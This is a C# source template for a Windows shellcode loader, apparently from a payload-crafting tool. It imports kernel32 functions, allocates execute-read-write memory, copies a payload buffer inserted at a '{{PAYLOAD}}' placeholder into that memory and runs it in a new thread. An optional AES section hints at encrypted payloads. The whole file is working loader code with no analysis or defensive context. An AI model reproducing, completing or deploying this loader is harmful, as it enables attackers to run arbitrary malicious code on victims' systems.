using System;
using System.Runtime.InteropServices;
#if AES
using System.Security.Cryptography;
#endif

namespace Craft
{
    public class Program
    {
        public const uint EXECUTEREADWRITE  = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void Main()
        {
            {{PAYLOAD}}
        
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, COMMIT_RESERVE, EXECUTEREADWRITE);
            Marshal.Copy(buf, 0, addr, buf.Length);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}